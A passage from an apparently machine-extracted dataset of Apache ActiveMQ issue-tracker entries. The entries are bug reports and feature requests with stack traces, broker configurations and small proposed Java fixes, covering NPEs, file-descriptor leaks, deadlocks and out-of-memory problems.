Symptom========When starting a statically-configured network of two AMQ brokers, each of which uses HTTP as their transport, if one of the brokers is not running when the other starts up, the following NPE appears in the logs:2009-11-01 11:05:53,626 &#91;AlarmPoint Node-main&#93; INFO    -  - Using Persistence Adapter: MemoryPersistenceAdapter2009-11-01 11:05:53,626 &#91;AlarmPoint Node-main&#93; INFO    -  - ActiveMQ 5.3.0 JMS Message Broker (localhost) is starting2009-11-01 11:05:53,626 &#91;AlarmPoint Node-main&#93; INFO    -  - For help or more information please see: http://activemq.apache.org/2009-11-01 11:05:53,829 &#91;AlarmPoint Node-main&#93; WARN    -  - 2009-11-01 11:05:53.445::INFO:  Logging to STDERR via org.mortbay.log.StdErrLog2009-11-01 11:05:53,876 &#91;AlarmPoint Node-main&#93; WARN    -  - 2009-11-01 11:05:53.492::INFO:  jetty-6.1.92009-11-01 11:05:53,922 &#91;AlarmPoint Node-main&#93; WARN    -  - 2009-11-01 11:05:53.538::INFO:  Started SocketConnector@localhost:500002009-11-01 11:05:53,922 &#91;AlarmPoint Node-main&#93; INFO    -  - Connector http://localhost:50000 Started2009-11-01 11:05:53,922 &#91;AlarmPoint Node-main&#93; INFO    -  - Establishing network connection from vm://localhost to http://192.168.168.44:500012009-11-01 11:05:53,938 &#91;AlarmPoint Node-main&#93; DEBUG   -  - binding to broker: localhost2009-11-01 11:05:53,938 &#91;AlarmPoint Node-main&#93; INFO    -  - Connector vm://localhost Started2009-11-01 11:05:57,954 &#91;AlarmPoint Node-main&#93; DEBUG   -  - Shutting down VM connectors for broker: localhost2009-11-01 11:05:57,954 ActiveMQ Transport Stopper: vm://localhost#0 DEBUG   -  - Stopping connection: vm://localhost#02009-11-01 11:05:57,954 ActiveMQ Transport Stopper: vm://localhost#0 DEBUG   -  - Stopped transport: vm://localhost#02009-11-01 11:05:57,954 ActiveMQ Transport Stopper: vm://localhost#0 DEBUG   -  - Connection Stopped: vm://localhost#02009-11-01 11:05:57,954 &#91;AlarmPoint Node-main&#93; INFO    -  - Connector vm://localhost Stopped2009-11-01 11:05:57,954 &#91;AlarmPoint Node-main&#93; ERROR   -  - Could not stop service: HTTP Reader http://192.168.168.44:50001. Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException at org.apache.activemq.transport.http.HttpClientTransport.doStop(HttpClientTransport.java:202) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:69) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64) at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:125) at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43) at org.apache.activemq.network.DiscoveryNetworkConnector.onServiceAdd(DiscoveryNetworkConnector.java:134) at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent.start(SimpleDiscoveryAgent.java:77) at org.apache.activemq.network.DiscoveryNetworkConnector.handleStart(DiscoveryNetworkConnector.java:182) at org.apache.activemq.network.NetworkConnector$1.doStart(NetworkConnector.java:56) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53) at org.apache.activemq.network.NetworkConnector.start(NetworkConnector.java:199) at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:1933) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:471) at com.invoqsystems.foundation.component.communication.MessageBusImpl.startJmsBroker(MessageBusImpl.java:602) at com.invoqsystems.foundation.component.communication.MessageBusImpl.start(MessageBusImpl.java:364) at com.invoqsystems.apex.component.communication.NodeMessageBusImpl.start(NodeMessageBusImpl.java:207) at com.invoqsystems.apex.component.node.manager.NodeManager.startMessagingServer(NodeManager.java:975) at com.invoqsystems.apex.component.node.manager.NodeManager.start(NodeManager.java:199) at com.invoqsystems.apex.AlarmPointNode.startNodeManager(AlarmPointNode.vaja:162) at com.invoqsystems.apex.AlarmPointNode.run(AlarmPointNode.java:62) at java.lang.Thread.run(Thread.java:595)Reproduction===========Configure one broker to listen to http://localhost:50000 and the other broker to list to http://localhost:50001.  Network the brokers together using the SimpleDiscoveryAgent (static) configuration:<broker brokerName="broker1" persistent="false" useJmx="false">      <networkConnectors>      <networkConnector uri="statichttp://localhost:50001)"/>    </networkConnectors>    <persistenceAdapter>      <memoryPersistenceAdapter/>    </persistenceAdapter>   <transportConnectors>      <transportConnector uri="http://localhost:50000"/>       </transportConnectors></broker>and the other broker as:<broker brokerName="broker2" persistent="false" useJmx="false">      <networkConnectors>      <networkConnector uri="statichttp://localhost:50000)"/>    </networkConnectors>    <persistenceAdapter>      <memoryPersistenceAdapter/>    </persistenceAdapter>   <transportConnectors>      <transportConnector uri="http://localhost:50001"/>       </transportConnectors></broker>Start broker1, but do not start broker2.  Observe the stacktrace in broker1"s logs.Cause======During startup, the following code executes in DiscoveryNetworkConnector#onServiceAdd(DiscoveryEvent event):            NetworkBridge bridge = createBridge(localTransport, remoteTransport, event);            try {                bridge.start();                bridges.put(uri, bridge);            } catch (Exception e) {                ServiceSupport.dispose(localTransport);                ServiceSupport.dispose(remoteTransport);                LOG.warn("Could not start network bridge between: " + localURIName + " and: " + uri + " due to: " + e);A bridge is created to connect broker1 to broker2 (http://localhost:50000 to http://localhost:50001), but since broker2 is not started, bridge.start() will throw a "Connection refused" exception.  In handling this exception, ServiceSupport.dispose(remoteTransport) is called, which eventually calls through to HttpClientTransport#doStop(ServiceStopper stopper):    protected void doStop(ServiceStopper stopper) throws Exception {            httpMethod.abort();    }The NPE is caused becuase httpMethod is null.When bridge.start() is called, it will pass through to HttpClientTransport#doStart():        LOG.trace("HTTP GET consumer thread starting: " + this);        HttpClient httpClient = getReceiveHttpClient();        URI remoteUrl = getRemoteUrl();        HeadMethod httpMethod = new HeadMethod(remoteUrl.toString());        configureMethod(httpMethod);        int answer = httpClient.executeMethod(httpMethod);The httpClient.executeMethod(httpMethod) throws the "connection refused" exception because the HEAD command cannot connect.  The httpMethod in doStart() is a local var, while the object-scope httpMethod is only set once the transport starts running,  which never occurs due to the HEAD failure.Solution=======Check that httpMethod is not null before disposing in HttpClientTransport:protected void doStop(ServiceStopper stopper) throws Exception {   if(httpMethod != null)   {     httpMethod.abort();   }}
issueID:AMQ-2473
type:Bug
changed files:
texts:Async error occurred: java.lang.NullPointerException
Our log file contains a NullPointerException: WARN | Async error occurred: java.lang.NullPointerExceptionjava.lang.NullPointerException at org.apache.activemq.broker.region.Queue.send(Queue.java:401) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:443) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:297) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:175) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185) at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-2474
type:New Feature
changed files:
texts:Enable broker-to-broker authentication and authorizarion using SSL certificates and jaasCertificateAuthenticationPlugin
Currently certificates are not propagated over the network connector, so jaas certificate authentication plugin cannot work for this use case
issueID:AMQ-2475
type:Bug
changed files:FilePendingMessageCursor.java
texts:If tmp message store fills up, broker can deadlock due to while producers wait on disk space and consumers wait on acks
I will attach a simple project that shows this. In the test the tmp space is set to 32 MB and two threads are created. One thread will constantly produce 1KB messages and the other consumes these, but sleeps for 100ms, note that producer flow control is turned off as well. The goal here is to ensure that the producers block while the consumers read the rest of the messages from the broker and catch up, this in turn frees up the disk space and allows the producer to send more messages. This config means that you can bound the broker based on disk space rather than memory usage.Unfortunately in this test using topics while the broker is reading in the message from the producer it has to lock the matched list it is adding it to. This is an abstract from the Topic"s point of view and doesn"t realize that the file may block based on the file system.     public void add(MessageReference node) throws Exception { //... snip ...            if (maximumPendingMessages != 0) {                synchronized (matchedListMutex) {   // We have this mutex                    matched.addMessageLast(node); // ends up waiting for space                    // NOTE - be careful about the slaveBroker!                    if (maximumPendingMessages > 0) {Meanwhile the consumer is sending acknowledgements for the 10 messages it just read in (the configured prefetch) from the same topic, but since they also modify the same list in the topic this waits as well on the mutex held to service the producer:    private void dispatchMatched() throws IOException {               synchronized (matchedListMutex) {  // never gets passed here.            if (!matched.isEmpty() && !isFull()) {This is a fairly classic deadlock. The trick is now how to resolve this given the fact that the topic isn"t aware that it"s list may need to wait for the file system to clean up.
issueID:AMQ-2478
type:Bug
changed files:DataFile.java
texts:Too many files open error, after no space left on device occurs; if producer carries on sending messages.
The problem seem to be that open the persistence store (disk) has run out of space, if the producer keeps on sending messages to the broker the brokers end up eating up the file descriptors for the process (default 1024), and you get the error "too many open files".  The only way to fix this is a broker restart.1) Producer is sending to the broker2) Disk Space on the broker runs out3) The producer gets the error:&#91;2009.11.02 23:05:30&#93; &#91;main&#93; INFO  ProducerTool -  Sent Message:&#91;18973 : ^@^@OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO...&#93;, took: 1ms&#91;2009.11.02 23:05:30&#93; &#91;main&#93; WARN  ProducerTool -  Error sendingmessage:18974 : @@OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO...javax.jms.JMSException: No space left on device      at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)      at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1255)4)  The broker gets the error:DEBUG Service                        - Error occured while processingasync command: MessageAck {commandId = 53297, responseRequired =false, ackType = 2, consumerId =ID:dominic-tootells-macbook-pro.local-57138-1257203010059-0:0:-1:2,firstMessageId =ID:dominic-tootells-macbook-pro.local-57143-1257203033952-0:0:1:1:17751,lastMessageId =ID:dominic-tootells-macbook-pro.local-57143-1257203033952-0:0:1:1:17751,destination = queue://iplayer, transactionId =TX:ID:dominic-tootells-macbook-pro.local-57138-1257203010059-0:0:17751,messageCount = 1}, exception: java.io.IOException: No space left ondevicejava.io.IOException: No space left on device       at java.io.RandomAccessFile.setLength(Native Method)5) All is good if you spot this and go clear up some space quicksharp; both the broker and the producer recover and can carry one.However, if you don"t notice and react quick enough, and the producerkeeps on sending messages to the broker, then broker ends up with theerror "too many open files":Id = ID:dominic-tootells-macbook-pro.local-57143-1257203033952-0:0:1:1:35920,lastMessageId =ID:dominic-tootells-macbook-pro.local-57143-1257203033952-0:0:1:1:35920,destination = queue://iplayer, transactionId =TX:ID:dominic-tootells-macbook-pro.local-57138-1257203010059-0:0:52674,messageCount = 1}, exception: java.io.FileNotFoundException:/Volumes/SSD/data/journal/data-4 (Too many open files)java.io.FileNotFoundException: /Volumes/SSD/data/journal/data-4 (Toomany open files)       at java.io.RandomAccessFile.open(Native Method)       at java.io.RandomAccessFile.<init>(RandomAccessFile.java:212)       at org.apache.activemq.kaha.impl.async.DataFile.openRandomAccessTrying the following combinations: no failover protocol no send sendFailIfNoSpace being sent to the producer recreating the producer connection after the error no consumer attached to the brokerIn the end I attached JProfiler to the broker (via a small junit), andnoticed that upon the "No space left on device" error the number ofFile objects and FileDescriptor objects would grow, and not shrink.Upon looking at the below stack trace:Caused by: java.io.IOException: No space left on device       at java.io.RandomAccessFile.setLength(Native Method)       at org.apache.activemq.kaha.impl.async.DataFile.openRandomAccessFile(DataFile.java:96)       at org.apache.activemq.kaha.impl.async.AsyncDataManager.allocateLocation(AsyncDataManager.java:276)       at org.apache.activemq.kaha.impl.async.DataFileAppender.storeItem(DataFileAppender.java:169)       at org.apache.activemq.kaha.impl.async.AsyncDataManager.write(AsyncDataManager.java:647)       at org.apache.activemq.store.amq.AMQPersistenceAdapter.writeCommand(AMQPersistenceAdapter.java:697)       at org.apache.activemq.store.amq.AMQPersistenceAdapter.writeCommand(AMQPersistenceAdapter.java:693)       at org.apache.activemq.store.amq.AMQMessageStore.addMessage(AMQMessageStore.java:106)       at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:503)       at org.apache.activemq.broker.region.Queue.send(Queue.java:480)       at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354)       at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:443)       at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)       at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)       at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)       at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:455)       at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:639)       at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308)       at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182)       at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)       at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)       at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210)       at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)       at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)       at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)       at java.lang.Thread.run(Thread.java:637)I took a look at:org.apache.activemq.kaha.impl.async.DataFile.openRandomAccessFile(DataFile.java:96):  public synchronized RandomAccessFile openRandomAccessFile(booleanappender) throws IOException {       RandomAccessFile rc = new RandomAccessFile(file, "rw");       // When we start to write files size them up so that the OS has a chance       // to allocate the file contigously.       if (appender) {           if (length < preferedSize) {                       rc.setLength(preferedSize);           }       }       return rc;   }  The problem is the rc.setLength(preferedSize);  without a try/catchblock to close the opened file incase of a IOException, that canresult from the setLength on empty filesystem.  Changing the method to, contain a try/catch as follows, from my testing appears to fix theissue (have tried on my local broker, and this works).  public synchronized RandomAccessFile openRandomAccessFile(booleanappender) throws IOException {       RandomAccessFile rc = new RandomAccessFile(file, "rw");       // When we start to write files size them up so that the OS has a chance       // to allocate the file contigously.       if (appender) {           if (length < preferedSize) {               try               {                       rc.setLength(preferedSize);               }               catch(IOException e)               {                       try                       {                               rc.close();                       }                       catch(Exception closeException){}                       throw e;               }           }       }       return rc;   }I shall attach a junit for testing (it is hard coded to write to my small removal disk /Volumes/SSD/data), so this you will need to change.  I need somewhere where I could fill the disk up.  The Junit just does: Producer writes to a persistent queue until the disk space fills up and keeps on going.  After a while you see the "too many open files" exception.I"ve looked at trunkhttps://svn.apache.org/repos/asf/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/kaha/impl/async/DataFile.javaAnd this has the same code as the 5.3.0.4 so I"m guessing that would have the same issue.I"ll attach the junit, the patch diff and the patch file./dom
issueID:AMQ-2481
type:Bug
changed files:
texts:OOM due to message expiry processing with large numbers of messages in queue because of slow or absent consumers.
when a large of messages in queue,and no consumer or the consumer is veryslow, the OOM problem occur, because :in org.apache.activemq.broker.region.Queue,the 588 line is : doBrowse(true, browsedMessages, this.getMaxExpirePageSize());,transform to :doBrowse(false, browsedMessages, this.getMaxExpirePageSize()); is ok.from user list: http://old.nabble.com/Out-of-Memory-on-5.3-ts26064098.html#a26264779Problem is messages get paged into memory with out any limiter.Note:disabling periodic expiry processing using a destination policy can work around this. set expireMessagesPeriod = 0
issueID:AMQ-2483
type:Bug
changed files:
texts:OOM due to build of of iterate executions during bulk message consumption - asyncWakeup called excessivly
when consuming a large of messages,the method:asyncWakeup() is invokedcrazily,so the executor has a great deal of  runnable that callback Queue.iterate(), butQueue.iterate() is much slower than the increasing of runnable in theexecutor. this result in OOM.avoid to invoke the method:asyncWakeup()  frequently???http://old.nabble.com/file/p26278228/oom.jpgContext:  http://old.nabble.com/Out-of-Memory-on-5.3-tp26064098p26297020.html
issueID:AMQ-2484
type:Improvement
changed files:
texts:Avoid stuck messages in a network of brokers
In certain fail over scenarios messages can become "stuck" in a network of brokers. This would be the case if the message was forwarded to a broker because a consumer existed, but the consumer disconnects or dies before the message can be delivered. Th then the consumer reconnects to the network of brokers it might be, that it connects to another member of the NWOB alltogether. If the message has already passed that other broker on its way, the message is stuck. To solve this I was thinking along the lines of allowing a NWOB-redelivery policy. The default for this could be "NONE" and would represent the current behavior. On top of that it would be nice to configure a timeout, after which the message will be passed on even to nodes that it has already crossed. Perhaps some kind of backoffmultiplier would make sense here as well ?Another way might be to simply "forget" the path the message came across, but I am not sure about the potential impacts regarding duplicate messages or similar issues.
issueID:AMQ-2486
type:Bug
changed files:BrokerService.java
texts:systemExitOnShutdown="true" causes broker shutdown to hang
To reproduce: add systemExitOnShutdown="true" to the <broker> tag start a broker try to stop the broker
issueID:AMQ-2487
type:Bug
changed files:
texts:MemoryUsage not properly accounted for when expiring messages to DLQ: can lead to hang.
Given the following broker destination policy     <destinationPolicy>      <policyMap>        <policyEntries>          <policyEntry topic=">" producerFlowControl="true"            memoryLimit="1mb">            <pendingSubscriberPolicy>              <vmCursor />            </pendingSubscriberPolicy>          </policyEntry>          <policyEntry queue=">" producerFlowControl="true"            memoryLimit="1mb">            <!--              Use VM cursor for better latency For more information,              see: http://activemq.apache.org/message-cursors.html            -->            <pendingQueuePolicy>              <vmQueueCursor />            </pendingQueuePolicy>          </policyEntry>        </policyEntries>      </policyMap>    </destinationPolicy>If I send message to queue://TESTQ1 with an expiration of 1second, with an unreliable/slow receiver, the publisher eventually hangs sending to the queue. The underlying problem is that when the message is expired to the DLQ the MemoryUsage reference is left pointing the TESTQ1"s memory limiter, instead of being reset to the DLQ limiter, and when it is added to the DLQ, TESTQ1"s memory limiter is updated counteracting the decrement that is done by the TESTQ1 when the message is expired.
issueID:AMQ-2488
type:Bug
changed files:
texts:Unable to access Serializable class when receiving ObjectMessage in OSGi environment
I have configured applications to use Log4J"s JMSAppender in order to log messages on a queue as follows;log4j.appender.jms=org.apache.log4j.net.JMSAppenderlog4j.appender.jms.InitialContextFactoryName=org.apache.activemq.jndi.ActiveMQInitialContextFactorylog4j.appender.jms.ProviderURL=tcp://localhost:61616log4j.appender.jms.TopicBindingName=logTopiclog4j.appender.jms.TopicConnectionFactoryBindingName=ConnectionFactoryEach application logging statement adds a new message to topic://logTopic on the broker.  I have a bundle deployed that attempts to route the messages from this topic with camel;from("activemq:topic:logTopic")  .convertBodyTo(String.class)  .to("log:foo?level=DEBUG&showProperties=true&showHeaders=true");When using servicemix 4 (Fuse 4.1.0.4), a stack trace is seen with the following message (enhanced using felix.log.level=4);Caused by: java.lang.ClassNotFoundException: *** Class "org.apache.log4j.spi.LoggingEvent" was not found because bundle 56 does not import "org.apache.log4j.spi" even though bundle 84 does export it. To resolve this issue, add an import for "org.apache.log4j.spi" to bundle 56. ***Bundles as follows;smx@root:/> osgi/list|grep 56[  56] [Active     ] [       ] [   60] activemq-core (5.3.0.fuse)smx@root:/> osgi/list|grep 84[  84] [Active     ] [       ] [    8] OPS4J Pax Logging - API (1.3.0)
issueID:AMQ-2489
type:Bug
changed files:
texts:"Could not correlate acknowledgment with dispatched message" exception
This exception is thrown on broker side when two or more ASYNCH consumers acknowledges messages in not in order they received the messages.See more on users list: http://old.nabble.com/%22Could-not-correlate-acknowledgment-with-dispatched-message%22-td26308220.htmlSimple unit test attached.
issueID:AMQ-2490
type:Bug
changed files:
texts:JMSXUserID not propogated to STOMP consumer
The userID from the ActiveMQ message object is not set on a STOMP frame.Attached is a patch on the STOMP FrameTranslator to set a "JMSXUserID" header if it present in the message.Test cases showing the header being propogated from STOMP to both JMS and STOMP consumers properly
issueID:AMQ-2492
type:Improvement
changed files:
texts:Microsoft SQL Server JDBC Driver 2.0 not recognized
The sqljdbc4.jar driver from http://www.microsoft.com/downloads/details.aspx?FamilyID=99b21b65-e98f-4a61-b811-19912601fdc9&displaylang=en is not recognized.The log says:INFO | Using Persistence Adapter: JDBCPersistenceAdapter(org.apache.commons.dbcp.BasicDataSource@47570945)WARN | Database lock driver override not found for : &#91;microsoft_sql_server_jdbc_driver_2_0&#93;.  Will use default implementation.The fix is to add     activemq-coresrcmainesourcesMETA-INFservicesorgapacheactivemqstorejdbcmicrosoft_sql_server_jdbc_2_0_driver     activemq-coresrcmainesourcesMETA-INFservicesorgapacheactivemqstorejdbclockmicrosoft_sql_server_jdbc_2_0_driverWith the same content as the microsoft_sql_server_2005_driver in both directories.I"ve attached a pach
issueID:AMQ-2493
type:Bug
changed files:JDBCPersistenceAdapter.java
texts:Warning about using default locking mechanism should be an info
The warning:INFO  JDBCPersistenceAdapter         - Database lock driver override not found for : [apache_derby_embedded_jdbc_driver].  Will use default implementation.can cause confusion and tends to suggest that there is something wrong while it is just informing that activemq will use the DefaultDatabaseLocker instead of a specific DB locker.  So it should be an "INFO" rather than a "WARN".
issueID:AMQ-2499
type:Improvement
changed files:
texts:Prevent logging of passwords in ActiveMQ log
ConnectionInfo prints its properties in log file when DEBUG level is used. We should hide passwords sent in connection info object.
issueID:AMQ-2501
type:Bug
changed files:
texts:Modify Apache Camel version of the pom
The current pom of the activemq project uses 2.0 as camel version.The issue is that when we deploy activemq-camel 5.3.0 top of servicemix 4.1.0-SNAPSHOT, we have a classloading issue because activemq-camel bundle cannot import org.apache.camel.component.jms package from Camel 2.1.SNAPSHOTMay I propose to change version or add a version range in the MANIFEST file generated for activemq-camel :The current is :Import-Package: META-INF.services.org.apache.camel,javax.jms;version=" [1.1,1.2)",org.apache.activemq;version="[5.3,5.4)",org.apache.activem q.advisory;version="[5.3,5.4)",org.apache.activemq.camel;version="[5. 3,5.4)",org.apache.activemq.camel.component;version="[5.3,5.4)",org.a pache.activemq.camel.converter;version="[5.3,5.4)",org.apache.activem q.command;version="[5.3,5.4)",org.apache.activemq.kaha.impl.async;ver sion="[5.3,5.4)",org.apache.activemq.management;version="[5.3,5.4)",o rg.apache.activemq.spring;version="[5.3,5.4)",org.apache.activemq.tra nsport;version="[5.3,5.4)",org.apache.activemq.util;version="[5.3,5.4 )",org.apache.camel;resolution:=optional;version="[2.0,2.1)",org.apac he.camel.component.jms;resolution:=optional;version="[2.0,2.1)",org.a pache.camel.impl;resolution:=optional;version="[2.0,2.1)",org.apache. camel.util;resolution:=optional;version="[2.0,2.1)",org.apache.common s.logging,org.apache.xbean.spring.context.v2;resolution:=optional,org .springframework.beans.factory;resolution:=optional;version="[2.5,2.6 )",org.springframework.beans.factory.xml;resolution:=optional;version ="[2.5,2.6)",org.springframework.jms.connection;resolution:=optional; version="[2.5,2.6)",org.springframework.transaction;resolution:=optio nal;version="[2.5,2.6)"
issueID:AMQ-2502
type:Bug
changed files:
texts:activemq-camel is missing an optional Import-Package for org.apache.activemq.pool
If pooling is used, org.apache.activemq.pool.PooledConnectionFactory is instantiated using reflection. BND does not detect this, so compliant OSGI containers will throw a class not found exception. To fix, the following line should be added to the <activemq.osgi.import.pkg /> section of the pom:org.apache.activemq.pool;resolution:=optional,
issueID:AMQ-2505
type:Bug
changed files:
texts:Problem with servicing broker messages when client hostName contains "language specific" characters (org.apache.activemq.util.IdGenerator problem)
When name of the activeMQ client machine contains "language specific" letters (e.g. "Gł_Ksiegowa") communication fails:"Caused by: java.io.IOException: Failed to broker message: ID:Gł_Ksiegowa-1407-1256558735734-0:2:3:1:1 in container: java.io.UTFDataFormatException: bad string "To resolve the problem in our system we"ve changed org.apache.activemq.util.IdGenerator code - we replaced line:"hostName = InetAddress.getLocalHost().getHostName();"with:"hostName = InetAddress.getLocalHost().getHostAddress();"The whole exception below:ERROR 2009-10-26 13:07:30,781 &#91;AWT-EventQueue-0&#93; - Local JMS transaction failed to commit; nested exception is javax.jms.JMSException: POST COMMIT FAILED org.springframework.jms.connection.SynchedLocalTransactionFailedException: Local JMS transaction failed to commit; nested exception is javax.jms.JMSException: POST COMMIT FAILED at org.springframework.jms.connection.ConnectionFactoryUtils$JmsResourceSynchronization.processResourceAfterCommit(ConnectionFactoryUtils.java:408) at org.springframework.transaction.support.ResourceHolderSynchronization.afterCommit(ResourceHolderSynchronization.java:74) at org.springframework.transaction.support.TransactionSynchronizationUtils.invokeAfterCommit(TransactionSynchronizationUtils.java:114) at org.springframework.transaction.support.TransactionSynchronizationUtils.triggerAfterCommit(TransactionSynchronizationUtils.java:100) at org.springframework.transaction.support.AbstractPlatformTransactionManager.triggerAfterCommit(AbstractPlatformTransactionManager.java:931) at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:774) at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:701) at org.springframework.transaction.interceptor.TransactionAspectSupport.commitTransactionAfterReturning(TransactionAspectSupport.java:321) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:116) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171) at org.springframework.aop.framework.Cglib2AopProxy$DynamicAdvisedInterceptor.intercept(Cglib2AopProxy.java:635) at info.fingo.asist.gui.controls.periodslist.status.ReportStatusHelper$$EnhancerByCGLIB$$2dab363.changeReportsStatus(<generated>) at info.fingo.asist.action.ChangeReportStatusAction.asistActionPerformed(ChangeReportStatusAction.java:30) at info.fingo.asist.action.MultiReportAction.asistActionPerformed(MultiReportAction.java:80) at info.fingo.asist.action.AsistAction.fireAsistActionPerformed(AsistAction.java:297) at info.fingo.asist.action.AsistAction.actionPerformed(AsistAction.java:322) at javax.swing.AbstractButton.fireActionPerformed(Unknown Source) at javax.swing.AbstractButton$Handler.actionPerformed(Unknown Source) at javax.swing.DefaultButtonModel.fireActionPerformed(Unknown Source) at javax.swing.DefaultButtonModel.setPressed(Unknown Source) at javax.swing.AbstractButton.doClick(Unknown Source) at javax.swing.plaf.basic.BasicMenuItemUI.doClick(Unknown Source) at javax.swing.plaf.basic.BasicMenuItemUI$Handler.mouseReleased(Unknown Source) at java.awt.AWTEventMulticaster.mouseReleased(Unknown Source) at java.awt.Component.processMouseEvent(Unknown Source) at javax.swing.JComponent.processMouseEvent(Unknown Source) at java.awt.Component.processEvent(Unknown Source) at java.awt.Container.processEvent(Unknown Source) at java.awt.Component.dispatchEventImpl(Unknown Source) at java.awt.Container.dispatchEventImpl(Unknown Source) at java.awt.Component.dispatchEvent(Unknown Source) at java.awt.LightweightDispatcher.retargetMouseEvent(Unknown Source) at java.awt.LightweightDispatcher.processMouseEvent(Unknown Source) at java.awt.LightweightDispatcher.dispatchEvent(Unknown Source) at java.awt.Container.dispatchEventImpl(Unknown Source) at java.awt.Window.dispatchEventImpl(Unknown Source) at java.awt.Component.dispatchEvent(Unknown Source) at java.awt.EventQueue.dispatchEvent(Unknown Source) at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source) at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source) at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source) at java.awt.EventDispatchThread.pumpEvents(Unknown Source) at java.awt.EventDispatchThread.pumpEvents(Unknown Source) at java.awt.EventDispatchThread.run(Unknown Source) Caused by: javax.jms.JMSException: POST COMMIT FAILED at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1244) at org.apache.activemq.TransactionContext.commit(TransactionContext.java:263) at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:502) at org.springframework.jms.connection.JmsResourceHolder.commitAll(JmsResourceHolder.java:182) at org.springframework.jms.connection.ConnectionFactoryUtils$JmsResourceSynchronization.processResourceAfterCommit(ConnectionFactoryUtils.java:405) ... 43 more Caused by: javax.transaction.xa.XAException: POST COMMIT FAILED at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:154) at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:94) at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:94) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:104) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:424) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:99) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:65) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:133) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:137) at java.lang.Thread.run(Unknown Source) Caused by: java.lang.RuntimeException: java.io.IOException: Failed to broker message: ID:Gł_Ksiegowa-1407-1256558735734-0:2:3:1:1 in container: java.io.UTFDataFormatException: bad string at org.apache.activemq.broker.region.IndirectMessageReference.incrementReferenceCount(IndirectMessageReference.java:103) at 